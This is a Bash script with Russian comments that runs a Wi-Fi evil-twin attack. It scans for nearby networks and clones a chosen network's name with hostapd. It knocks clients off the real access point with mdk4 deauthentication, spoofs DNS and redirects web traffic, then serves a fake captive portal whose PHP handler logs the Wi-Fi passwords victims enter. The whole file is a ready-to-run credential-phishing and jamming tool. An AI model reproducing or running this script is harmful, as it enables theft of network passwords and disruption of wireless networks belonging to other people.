#!/usr/bin/env bash

set -e  # Выходим сразу при любой ошибке

WORKSPACE="./workspace"
PASSLOG="./attacks/Captive Portal/pwdlog"
NETLOG="./attacks/Captive Portal/netlog"
mkdir -p "$WORKSPACE" "$PASSLOG" "$NETLOG"

RED="\e[1;31m"
GREEN="\e[1;32m"
YELLOW="\e[1;33m"
BLUE="\e[1;34m"
NC="\e[0m"

GATEWAY="192.169.254.1"
NETWORK="${GATEWAY%.*}"

# === Проверка зависимостей ===
for cmd in iw airodump-ng hostapd dnsspoof dhcpd lighttpd mdk4; do
  command -v "$cmd" >/dev/null || { echo -e "${RED}$cmd не найден!${NC}"; exit 1; }
done

# === Перевод в monitor mode с проверкой ===
set_monitor_mode() {
  local iface=$1
  echo -e "${YELLOW}Перевожу $iface в monitor mode...${NC}"
  ip link set "$iface" down
  iw dev "$iface" set type monitor >/dev/null 2>&1 || { echo -e "${RED}Не удалось перевести в monitor${NC}"; exit 1; }
  ip link set "$iface" up
  sleep 3
}

set_managed_mode() {
  local iface=$1
  echo -e "${YELLOW}Возвращаю $iface в managed mode...${NC}"
  ip link set "$iface" down
  iw dev "$iface" set type managed >/dev/null 2>&1
  ip link set "$iface" up
}

# === Выбор интерфейса ===
echo -e "${YELLOW}Выбери Wi-Fi интерфейс (обычно wlan0):${NC}"
iw dev | grep Interface | awk '{print $2}'
read -p "> " JAMMER_IFACE

set_monitor_mode "$JAMMER_IFACE"

# === Сканирование с гарантией записи файла ===
scan_networks() {
  echo -e "${BLUE}Сканирую сети минимум 30 секунд... Жди, сейчас будут сети!${NC}"
  timeout 40 airodump-ng "$JAMMER_IFACE" --output-format csv -w "$WORKSPACE/scan" >/dev/null 2>&1 || true

  # Если файл всё ещё не появился — ждём ещё и принудительно создаём пустышку
  for i in {1..10}; do
    [ -f "$WORKSPACE/scan-01.csv" ] && break
    sleep 2
  done

  if [ ! -f "$WORKSPACE/scan-01.csv" ]; then
    echo -e "${RED}airodump-ng ничего не поймал. Попробуй внешнюю карту (Alfa, TP-Link и т.д.)${NC}"
    echo "Или вручную запусти: airodump-ng $JAMMER_IFACE"
    set_managed_mode "$JAMMER_IFACE"
    exit 1
  fi

  echo -e "${GREEN}Сети найдены!${NC}"
}

# === Выбор цели ===
select_target() {
  echo -e "${YELLOW}Доступные сети:${NC}"
  awk -F, 'NR>2 && $14!="" {printf "%3d) %-25s %s  Ch:%-3s %s\n", NR-2, $14, $1, $4, $6}' "$WORKSPACE/scan-01.csv" | nl

  read -p "Выбери номер: " num
  line=$(awk -F, -v n=$((num+1)) 'NR==n+1 {print}' "$WORKSPACE/scan-01.csv")
  TARGET_MAC=$(echo "$line" | cut -d, -f1 | xargs)
  TARGET_SSID=$(echo "$line" | cut -d, -f14 | xargs)
  TARGET_CHAN=$(echo "$line" | cut -d, -f4 | xargs)
  TARGET_SSID_CLEAN=$(echo "$TARGET_SSID" | tr -d '[:space:][:punct:]')

  echo -e "${GREEN}Цель: $TARGET_SSID ($TARGET_MAC) канал $TARGET_CHAN${NC}"
}

# === Остальное без изменений (коротко) ===
setup_ap_interface() {
  read -p "Интерфейс для AP (по умолчанию тот же $JAMMER_IFACE): " AP_IFACE_ORIG
  AP_IFACE="${AP_IFACE_ORIG:-$JAMMER_IFACE}"

  if [ "$AP_IFACE" = "$JAMMER_IFACE" ]; then
    AP_IFACE="${JAMMER_IFACE}v"
    iw dev "$JAMMER_IFACE" interface add "$AP_IFACE" type managed 2>/dev/null || true
  fi
  ip link set "$AP_IFACE" up
}

create_portal() { mkdir -p "$WORKSPACE/captive_portal"
  cat > "$WORKSPACE/captive_portal/index.html" <<EOF
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Wi-Fi</title></head><body style="text-align:center;margin-top:50px;font-family:sans-serif;">
<h2>Подключение к $TARGET_SSID</h2><form action="check.php" method="POST">
<input type="password" name="key1" placeholder="Пароль Wi-Fi" size="30"><br><br>
<input type="submit" value="Подключиться"></form></body></html>
EOF
  cat > "$WORKSPACE/captive_portal/check.php" <<EOF
<?php file_put_contents('$PASSLOG/$TARGET_SSID_CLEAN-$TARGET_MAC.log', \$_POST['key1']."\n", FILE_APPEND); header('Location: final.html'); ?>
EOF
  echo "<h2>Спасибо!</h2>" > "$WORKSPACE/captive_portal/final.html"
}

setup_lighttpd() {
  cat > "$WORKSPACE/lighttpd.conf" <<EOF
server.document-root = "$WORKSPACE/captive_portal"
server.port = 80
mimetype.assign = (".php" => "application/x-httpd-php")
index-file.names = ("index.html")
EOF
}

start_attack() {
  echo -e "${GREEN}Запускаю атаку...${NC}"

  ip addr add $GATEWAY/24 dev $AP_IFACE
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to $GATEWAY:80
  iptables -t nat -A POSTROUTING -j MASQUERADE

  dhcpd -f -cf <(echo "authoritative; subnet $NETWORK.0 netmask 255.255.255.0 { range $NETWORK.100 $NETWORK.254; option routers $GATEWAY; }") $AP_IFACE &
  echo "$GATEWAY *.*" > "$WORKSPACE/hosts"
  dnsspoof -i $AP_IFACE -f "$WORKSPACE/hosts" &
  lighttpd -f "$WORKSPACE/lighttpd.conf" &
  echo "$TARGET_MAC" > "$WORKSPACE/blacklist"
  mdk4 "$JAMMER_IFACE" d -c $TARGET_CHAN -b "$WORKSPACE/blacklist" &
  hostapd <(echo "interface=$AP_IFACE\nssid=$TARGET_SSID\nchannel=$TARGET_CHAN\nhw_mode=g") &

  echo -e "${YELLOW}Атака идёт! Пароли здесь: $PASSLOG/$TARGET_SSID_CLEAN-$TARGET_MAC.log${NC}"
  echo "Нажми Enter для остановки..."
  read _

  killall hostapd lighttpd dnsspoof dhcpd mdk4 2>/dev/null
  ip addr del $GATEWAY/24 dev $AP_IFACE 2>/dev/null
  iptables -t nat -F
  [ "$AP_IFACE" != "$JAMMER_IFACE" ] && iw dev "$AP_IFACE" del 2>/dev/null
  set_managed_mode "$JAMMER_IFACE"
  echo -e "${GREEN}Готово!${NC}"
}

# === Запуск ===
scan_networks
select_target
setup_ap_interface
create_portal
setup_lighttpd
start_attack